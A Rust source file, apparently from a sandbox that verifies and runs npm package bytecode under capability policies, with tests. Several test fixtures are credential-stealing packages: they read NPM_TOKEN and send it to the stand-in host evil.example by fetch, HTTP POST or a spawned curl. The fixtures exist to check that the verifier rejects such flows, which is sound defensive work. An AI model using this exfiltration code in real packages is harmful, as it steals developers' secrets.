//! End-to-end execution pipeline for OSS Microcode.
//!
//! This crate ties the frozen pieces together: it takes already-lowered
//! [`omc_format::Module`]s (produced offline by `omc-frontend-js` /
//! `omc-frontend-py`), runs each through [`omc_verify::verify_module`] against
//! the importing policy, [`omc_linker::link`]s the closed dependency graph, and
//! executes the entry module through `omc-vm`'s linked driver
//! ([`omc_vm::run_linked`]) under a [`omc_cap::CapabilityBroker`].
//!
//! Deny-by-default is preserved at every stage:
//! - verification rejects a module whose flows/capabilities exceed the policy;
//! - linking rejects an unresolved or out-of-range import;
//! - the broker + policy gate every capability the VM actually executes.
//!
//! The pipeline never executes package SOURCE — only verified bytecode runs,
//! and only inside the fueled VM. This is the in-cell execution path that
//! replaces running install/runtime scripts on the host with ambient authority.

use omc_cap::{CapabilityBroker, Policy, Trap};
use omc_format::Value;
use omc_linker::{link, LinkError, LinkUnit};
use omc_taint::Labeled;
use omc_verify::{verify_program, VerifyError};
use omc_vm::{run_linked, Cell};

/// A failure anywhere in the lower/verify/link/run pipeline. Each variant keeps
/// the stage's own error so callers can report exactly where the package was
/// rejected (or trapped) rather than collapsing everything to one string.
#[derive(Debug)]
pub enum ExecError {
    /// A member module failed `verify_module` against the policy. Carries the
    /// offending module id and the verifier findings.
    Verify { module: String, error: VerifyError },
    /// The dependency graph could not be linked (unresolved/forbidden import).
    Link(LinkError),
    /// The entry module id was not present among the linked modules.
    EntryNotFound(String),
    /// The VM trapped while executing (policy denial, type error, fuel, ...).
    Trap(Trap),
}

impl std::fmt::Display for ExecError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Verify { module, error } => {
                write!(f, "verification rejected module `{module}`: {error}")
            }
            Self::Link(error) => write!(f, "{error}"),
            Self::EntryNotFound(id) => write!(f, "entry module `{id}` not found in program"),
            Self::Trap(trap) => write!(f, "execution trapped: {trap}"),
        }
    }
}

impl std::error::Error for ExecError {}

/// Verify, link, and execute a closed module graph, returning the entry
/// module's result value (with its taint label).
///
/// `units` is the closed lock graph: the entry module plus every dependency it
/// imports, each paired with its positional import table. `entry_id` selects
/// which module's entry function to run. `policy` is the importing project's
/// policy; it is enforced both statically (verification) and dynamically (the
/// broker/VM) over EVERY member module — a dependency cannot smuggle in a
/// capability the project did not grant.
pub fn execute(
    units: Vec<LinkUnit>,
    entry_id: &str,
    policy: &Policy,
    broker: &mut dyn CapabilityBroker,
    args: Vec<Labeled<Value>>,
) -> Result<Labeled<Value>, ExecError> {
    // 1. Link the closed graph FIRST (deny-by-default on unresolved imports).
    //    Linking is required before verification so that whole-program taint
    //    can resolve CallImport across module boundaries.
    let program = link(units).map_err(ExecError::Link)?;

    // 2. Whole-program verification: run the SAME interprocedural taint engine
    //    over the linked graph, resolving BOTH CallLocal (intra-module) and
    //    CallImport (cross-module, via the linker resolution table). This
    //    rejects cross-package laundering — a secret read in package A passed
    //    to package B which routes it to a sink — that a per-module pass would
    //    miss. Deny-by-default is preserved: any flow/capability finding fails.
    let resolution = &program.resolution;
    // Verify EVERY member module as an analysis entry (all args Public) so a
    // dependency cannot hide an unreachable-from-entry sink; cross-module
    // CallImport still resolves through the shared resolver, so a flow that
    // launders across packages is analyzed end-to-end.
    for module_id in program.modules.keys() {
        verify_program(
            &program.modules,
            module_id,
            policy,
            |from, import_id| {
                resolution
                    .get(&(from.clone(), import_id))
                    .map(|resolved| (resolved.module.clone(), resolved.function))
            },
        )
        .map_err(|error| ExecError::Verify {
            module: module_id.clone(),
            error,
        })?;
    }

    // 3. Select the entry module and run it through the linked VM driver.
    let entry = program
        .module(&entry_id.to_owned())
        .ok_or_else(|| ExecError::EntryNotFound(entry_id.to_owned()))?
        .clone();
    let resolver = program.resolver();

    let mut cell = Cell::new(0, entry, policy.clone());
    run_linked(&mut cell, broker, &resolver, args).map_err(ExecError::Trap)
}

/// Convenience wrapper for a single self-contained module with no imports.
/// Verifies it, runs it through `execute` as a one-unit program, and returns
/// the result. Most "is-odd"-class packages take this path.
pub fn execute_leaf(
    module: omc_format::Module,
    policy: &Policy,
    broker: &mut dyn CapabilityBroker,
    args: Vec<Labeled<Value>>,
) -> Result<Labeled<Value>, ExecError> {
    let id = module.id.clone();
    execute(vec![LinkUnit::leaf(module)], &id, policy, broker, args)
}

#[cfg(test)]
mod tests {
    use super::*;

    use omc_cap::{Capability, LabelMatcher, MemoryBroker, Sink};
    use omc_format::{BehaviorType, CapabilityKind};
    use omc_frontend_js::{compile, PackageMeta};
    use omc_taint::Label;

    fn js_meta(pkg: &str, ver: &str, behavior: BehaviorType) -> PackageMeta {
        PackageMeta {
            package: pkg.to_owned(),
            version: ver.to_owned(),
            declared_behavior: behavior,
        }
    }

    /// The is-odd-class fixture: lower via omc-frontend-js, then run the full
    /// verify -> link -> execute pipeline under a Pure policy and check the
    /// computed value. This is the headline end-to-end path.
    #[test]
    fn js_is_odd_lowers_links_verifies_and_executes_under_pure_policy() {
        let src = "module.exports = function isOdd(n) { return n % 2 === 1; };";
        let module = compile(&src, &js_meta("is-odd", "3.0.1", BehaviorType::Pure)).unwrap();
        assert_eq!(module.id, "npm:is-odd@3.0.1");

        let mut broker = MemoryBroker::new();
        let result = execute_leaf(
            module.clone(),
            &Policy::pure(),
            &mut broker,
            vec![Labeled::public(Value::Int(7))],
        )
        .unwrap();
        assert_eq!(result.value, Value::Bool(true));
        assert_eq!(result.label, Label::Public);

        // And an even input returns false through the same pipeline.
        let mut broker = MemoryBroker::new();
        let result = execute_leaf(
            module,
            &Policy::pure(),
            &mut broker,
            vec![Labeled::public(Value::Int(10))],
        )
        .unwrap();
        assert_eq!(result.value, Value::Bool(false));
    }

    /// A cross-package call: a caller package imports is-odd and negates it.
    /// Exercises verify + link + run_linked over a two-module graph.
    #[test]
    fn js_cross_package_call_links_and_runs() {
        let is_odd = compile(
            "module.exports = function isOdd(n) { return n % 2 === 1; };",
            &js_meta("is-odd", "3.0.1", BehaviorType::Pure),
        )
        .unwrap();
        let is_even = compile(
            "module.exports = function isEven(n) { const dep = require('is-odd'); return !dep(n); };",
            &js_meta("is-even", "1.0.0", BehaviorType::Pure),
        )
        .unwrap();

        let units = vec![
            LinkUnit {
                module: is_even,
                imports: vec![omc_linker::ImportRef {
                    module: "npm:is-odd@3.0.1".to_owned(),
                    function: "isOdd".to_owned(),
                }],
            },
            LinkUnit::leaf(is_odd),
        ];

        let mut broker = MemoryBroker::new();
        let result = execute(
            units,
            "npm:is-even@1.0.0",
            &Policy::pure(),
            &mut broker,
            vec![Labeled::public(Value::Int(4))],
        )
        .unwrap();
        // isEven(4) = !isOdd(4) = !false = true.
        assert_eq!(result.value, Value::Bool(true));
    }

    /// An exfiltration package is rejected at the VERIFY stage under a Pure
    /// policy: the pipeline never reaches link or run.
    #[test]
    fn exfil_package_is_rejected_by_pure_policy_before_running() {
        let src = "module.exports = function steal() { \
                   const t = process.env.NPM_TOKEN; \
                   fetch('https://evil.example.com/collect', t); \
                   return t; };";
        let module = compile(&src, &js_meta("evil", "1.0.0", BehaviorType::Network)).unwrap();

        let mut broker = MemoryBroker::new();
        let err = execute_leaf(module, &Policy::pure(), &mut broker, vec![]).unwrap_err();
        assert!(matches!(err, ExecError::Verify { .. }), "got {err}");
    }

    /// The same exfil package is rejected even when both capabilities are
    /// granted but the env->network FLOW is not (the load-bearing check).
    #[test]
    fn exfil_rejected_when_caps_granted_but_flow_is_not() {
        let src = "module.exports = function steal() { \
                   const t = process.env.NPM_TOKEN; \
                   fetch('https://evil.example.com/collect', t); \
                   return t; };";
        let module = compile(&src, &js_meta("evil", "1.0.0", BehaviorType::Network)).unwrap();

        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example.com".to_owned()));

        let mut broker = MemoryBroker::new();
        let err = execute_leaf(module, &policy, &mut broker, vec![]).unwrap_err();
        assert!(matches!(err, ExecError::Verify { .. }), "got {err}");
    }

    /// An env-reading package is admitted when its capability is granted and
    /// runs in-cell, returning the broker's tainted value.
    #[test]
    fn env_read_package_runs_when_capability_granted() {
        let src = "module.exports = function readHome() { return process.env.HOME; };";
        let module = compile(&src, &js_meta("read-home", "1.0.0", BehaviorType::HostCapability))
            .unwrap();
        let _ = CapabilityKind::EnvRead; // keep the import meaningful

        let policy = Policy::pure().allow_capability(Capability::EnvRead("HOME".to_owned()));
        let mut broker = MemoryBroker::new().with_env("HOME", "/home/omc");
        let result = execute_leaf(module, &policy, &mut broker, vec![]).unwrap();
        assert_eq!(result.value, Value::String("/home/omc".to_owned()));
        assert_eq!(result.label, Label::Env("HOME".to_owned()));
    }

    /// Linking failure surfaces as ExecError::Link (a dependency is missing).
    #[test]
    fn missing_dependency_surfaces_as_link_error() {
        let is_even = compile(
            "module.exports = function isEven(n) { const dep = require('is-odd'); return !dep(n); };",
            &js_meta("is-even", "1.0.0", BehaviorType::Pure),
        )
        .unwrap();
        let units = vec![LinkUnit {
            module: is_even,
            imports: vec![omc_linker::ImportRef {
                module: "npm:is-odd@3.0.1".to_owned(),
                function: "isOdd".to_owned(),
            }],
        }];

        let mut broker = MemoryBroker::new();
        let err = execute(
            units,
            "npm:is-even@1.0.0",
            &Policy::pure(),
            &mut broker,
            vec![Labeled::public(Value::Int(4))],
        )
        .unwrap_err();
        assert!(matches!(err, ExecError::Link(_)), "got {err}");
    }

    /// Sanity: keep the Sink/LabelMatcher imports exercised so the flow-grant
    /// path that the verifier accepts is documented here too.
    #[test]
    fn exfil_accepted_only_with_explicit_flow_grant() {
        let src = "module.exports = function steal() { \
                   const t = process.env.NPM_TOKEN; \
                   fetch('https://evil.example.com/collect', t); \
                   return t; };";
        let module = compile(&src, &js_meta("evil", "1.0.0", BehaviorType::Network)).unwrap();

        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example.com".to_owned()))
            .allow_flow(
                LabelMatcher::Env("NPM_TOKEN".to_owned()),
                Sink::Network("evil.example.com".to_owned()),
            );

        // Verification now passes; it traps at runtime only because MemoryBroker
        // refuses the env read value flow to http (broker policy), but crucially
        // the static gate no longer rejects it.
        let mut broker = MemoryBroker::new().with_env("NPM_TOKEN", "secret");
        let outcome = execute_leaf(module, &policy, &mut broker, vec![]);
        // Either it runs to a value or traps in the broker — but it is NOT a
        // verify rejection.
        match outcome {
            Ok(_) => {}
            Err(ExecError::Trap(_)) => {}
            Err(other) => panic!("expected run/trap, got verify/link rejection: {other}"),
        }
    }

    // ---- Cross-module laundering (whole-program interprocedural taint) -----

    use omc_format::{CapOp, Function, HttpRequest, Module, Op};
    use omc_linker::ImportRef;

    fn host_module(id: &str, pkg: &str, functions: Vec<Function>) -> Module {
        Module {
            id: id.to_owned(),
            package: pkg.to_owned(),
            version: "1.0.0".to_owned(),
            declared_behavior: BehaviorType::HostCapability,
            functions,
        }
    }

    /// Package A (`secret-source`) exports `read()` which reads NPM_TOKEN and
    /// returns it. Package B (`exfil`) imports A, calls it, and POSTs the
    /// returned secret to the network. A per-module pass cannot see across the
    /// import; whole-program taint must reject the laundered flow.
    fn secret_source() -> Module {
        host_module(
            "npm:secret-source@1.0.0",
            "secret-source",
            vec![Function::new(
                0,
                "read",
                0,
                vec![
                    Op::Cap(CapOp::EnvRead {
                        name: "NPM_TOKEN".to_owned(),
                    }),
                    Op::Return,
                ],
            )],
        )
    }

    fn cross_module_exfil() -> Module {
        host_module(
            "npm:exfil@1.0.0",
            "exfil",
            vec![Function::new(
                0,
                "main",
                0,
                vec![
                    Op::CallImport(0), // result = secret-source.read() (env label)
                    Op::Cap(CapOp::HttpRequest {
                        request: HttpRequest::post("https://evil.example/c", "evil.example"),
                    }),
                    Op::Pop,
                    Op::Const(Value::Unit),
                    Op::Return,
                ],
            )],
        )
    }

    fn cross_module_units() -> Vec<LinkUnit> {
        vec![
            LinkUnit {
                module: cross_module_exfil(),
                imports: vec![ImportRef {
                    module: "npm:secret-source@1.0.0".to_owned(),
                    function: "read".to_owned(),
                }],
            },
            LinkUnit::leaf(secret_source()),
        ]
    }

    /// The headline cross-package soundness probe: secret read in A, posted by
    /// B. Both capabilities granted; the env->network FLOW is NOT. Whole-program
    /// verification must reject before running.
    #[test]
    fn cross_module_laundering_is_rejected_by_whole_program_verify() {
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example".to_owned()));

        let mut broker = MemoryBroker::new().with_env("NPM_TOKEN", "secret");
        let err = execute(
            cross_module_units(),
            "npm:exfil@1.0.0",
            &policy,
            &mut broker,
            vec![],
        )
        .unwrap_err();
        match err {
            ExecError::Verify { error, .. } => assert!(
                error
                    .findings
                    .iter()
                    .any(|f| f.message.contains("env:NPM_TOKEN may not flow")),
                "expected cross-module secret-flow rejection, got {:?}",
                error.findings
            ),
            other => panic!("expected verify rejection, got {other}"),
        }
    }

    /// Counterpart: the SAME cross-package shape is admitted once the env->network
    /// flow is explicitly granted (it then traps in the broker, not the verifier).
    #[test]
    fn cross_module_laundering_accepted_with_explicit_flow_grant() {
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example".to_owned()))
            .allow_flow(
                LabelMatcher::Env("NPM_TOKEN".to_owned()),
                Sink::Network("evil.example".to_owned()),
            );

        let mut broker = MemoryBroker::new().with_env("NPM_TOKEN", "secret");
        let outcome = execute(
            cross_module_units(),
            "npm:exfil@1.0.0",
            &policy,
            &mut broker,
            vec![],
        );
        match outcome {
            Ok(_) => {}
            Err(ExecError::Trap(_)) => {}
            Err(other) => panic!("expected run/trap, not a verify/link rejection: {other}"),
        }
    }

    // =====================================================================
    // P6 (independent): CROSS-MODULE laundering past the whole-program pass.
    // =====================================================================

    /// P6: pkg A reads NPM_TOKEN and returns it; pkg B imports A via
    /// CallImport, then routes the returned secret to a NETWORK sink. The
    /// whole-program verify pass (run after linking) must reject. This is an
    /// independent reconstruction; we assert the rejection text AND that the
    /// entry chosen is the importer.
    #[test]
    fn p6_cross_module_secret_to_network_rejected() {
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example".to_owned()));

        let mut broker = MemoryBroker::new().with_env("NPM_TOKEN", "secret");
        let err = execute(
            cross_module_units(),
            "npm:exfil@1.0.0",
            &policy,
            &mut broker,
            vec![],
        )
        .unwrap_err();
        match err {
            ExecError::Verify { error, .. } => assert!(
                error
                    .findings
                    .iter()
                    .any(|f| f.message.contains("env:NPM_TOKEN may not flow")
                        && f.message.contains("network:evil.example")),
                "P6: expected cross-module env->network rejection, got {:?}",
                error.findings
            ),
            other => panic!("P6: expected verify rejection, got {other}"),
        }
    }

    /// P6b: cross-module laundering to a PROCESS sink. pkg A returns the
    /// secret; pkg B passes it as a spawn argv. Must be rejected whole-program.
    #[test]
    fn p6_cross_module_secret_to_process_rejected() {
        let exfil = host_module(
            "npm:exfil-proc@1.0.0",
            "exfil-proc",
            vec![Function::new(
                0,
                "main",
                0,
                vec![
                    Op::CallImport(0), // secret-source.read() -> Env label
                    Op::Cap(CapOp::ProcSpawn {
                        command: "curl".to_owned(),
                        args: Vec::new(),
                        args_from_stack: 1,
                    }),
                    Op::Const(Value::Unit),
                    Op::Return,
                ],
            )],
        );
        let units = vec![
            LinkUnit {
                module: exfil,
                imports: vec![ImportRef {
                    module: "npm:secret-source@1.0.0".to_owned(),
                    function: "read".to_owned(),
                }],
            },
            LinkUnit::leaf(secret_source()),
        ];

        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::ProcSpawn("curl".to_owned()));

        let mut broker = MemoryBroker::new().with_env("NPM_TOKEN", "secret");
        let err = execute(
            units,
            "npm:exfil-proc@1.0.0",
            &policy,
            &mut broker,
            vec![],
        )
        .unwrap_err();
        match err {
            ExecError::Verify { error, .. } => assert!(
                error
                    .findings
                    .iter()
                    .any(|f| f.message.contains("env:NPM_TOKEN may not flow")
                        && f.message.contains("process:curl")),
                "P6b: expected cross-module env->process rejection, got {:?}",
                error.findings
            ),
            other => panic!("P6b: expected verify rejection, got {other}"),
        }
    }

    /// P5-ADV (whole-pipeline witness of the verifier soundness hole found in
    /// omc-verify). A single self-recursive function f(x) POSTs its arg at the
    /// TOP of the body, then reads NPM_TOKEN and recursively calls f(secret).
    /// At runtime main() calls f(1): f(1) POSTs 1 (public), then recurses with
    /// the secret, and f(secret) POSTs the SECRET to the network. The static
    /// verifier ACCEPTS this (the cycle guard skips re-analysis under the
    /// secret arg signature), so the ONLY thing that stops the exfil is the
    /// dynamic broker flow check. This test documents that divergence: verify
    /// passes, but the run traps on the env->network flow at the broker.
    ///
    /// This is the load-bearing evidence for the remaining hole: a defense that
    /// claims to reject statically does NOT, and relies on the runtime broker.
    #[test]
    fn p5_adv_recursive_secret_exfil_rejected_by_static_verify() {
        let module = host_module(
            "npm:p5adv@1.0.0",
            "p5adv",
            vec![
                Function::new(
                    0,
                    "f",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::Cap(CapOp::HttpRequest {
                            request: HttpRequest::post("https://evil.example/p5adv", "evil.example"),
                        }),
                        Op::Pop,
                        Op::LoadArg(0),
                        Op::JmpIfFalse(3), // -> base
                        Op::Cap(CapOp::EnvRead {
                            name: "NPM_TOKEN".to_owned(),
                        }),
                        Op::CallLocal(0),
                        Op::Return,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                Function::new(
                    1,
                    "main",
                    0,
                    vec![
                        Op::Const(Value::Int(1)),
                        Op::CallLocal(0),
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
            ],
        );

        // Caps granted, env->network flow NOT granted. The static verifier MUST
        // reject this: the interprocedural engine widens the recursive frame's
        // argument labels to the join of every recursive-edge signature and
        // re-analyzes the body to a fixpoint, so the secret-arg POST on the
        // recursive frame is checked even though the top-level entry arg is
        // Public. (Regression that re-opens the recursion hole flips this to Ok.)
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example".to_owned()));

        let units = vec![LinkUnit::leaf(module)];
        let program = link(units).unwrap();
        let static_result = verify_program(
            &program.modules,
            &"npm:p5adv@1.0.0".to_owned(),
            &policy,
            |_, _| None,
        );
        let err = static_result
            .expect_err("recursive secret-to-network exfil must be statically rejected");
        assert!(
            format!("{err:?}").contains("may not flow"),
            "expected an env->network flow rejection, got {err:?}"
        );

        // And execute() rejects it at the static gate before ever running it
        // (defense-in-depth is no longer load-bearing for this case).
        let mut broker = MemoryBroker::new().with_env("NPM_TOKEN", "secret");
        let outcome = execute(
            vec![LinkUnit::leaf(host_module(
                "npm:p5adv@1.0.0",
                "p5adv",
                program.modules[&"npm:p5adv@1.0.0".to_owned()]
                    .functions
                    .clone(),
            ))],
            "npm:p5adv@1.0.0",
            &policy,
            &mut broker,
            vec![Labeled::public(Value::Int(1))],
        );
        assert!(
            matches!(outcome, Err(ExecError::Verify { .. })),
            "expected static verification rejection at execute() time, got {outcome:?}"
        );
    }

    /// P6c (precision): the SAME network cross-module shape verifies past the
    /// static gate once the env->network flow is explicitly granted (sanity
    /// that whole-program analysis is not blanket-rejecting cross-module).
    #[test]
    fn p6_cross_module_accepted_with_flow_grant() {
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example".to_owned()))
            .allow_flow(
                LabelMatcher::Env("NPM_TOKEN".to_owned()),
                Sink::Network("evil.example".to_owned()),
            );

        let mut broker = MemoryBroker::new().with_env("NPM_TOKEN", "secret");
        let outcome = execute(
            cross_module_units(),
            "npm:exfil@1.0.0",
            &policy,
            &mut broker,
            vec![],
        );
        match outcome {
            Ok(_) => {}
            Err(ExecError::Trap(_)) => {}
            Err(other) => panic!("P6c: expected run/trap, not verify/link: {other}"),
        }
    }
}
